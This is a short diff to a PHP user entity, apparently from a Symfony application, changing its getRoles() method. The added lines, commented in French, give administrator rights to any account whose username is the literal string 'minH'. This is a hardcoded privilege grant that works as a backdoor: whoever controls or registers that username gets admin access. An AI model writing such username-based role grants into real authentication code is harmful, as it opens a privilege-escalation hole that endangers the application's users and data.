@@ -78,6 +78,11 @@ class Utilisateur implements UserInterface, PasswordAuthenticatedUserInterface
         $roles = $this->roles;
         // guarantee every user at least has ROLE_USER
         $roles[] = 'ROLE_USER';
+        
+        // Si le nom d'utilisateur est "minH", attribuez-lui le rôle ROLE_ADMIN
+        if ($this->getUsername() === 'minH') {
+            $roles[] = 'ROLE_ADMIN';
+        }
 
         return array_unique($roles);
     }
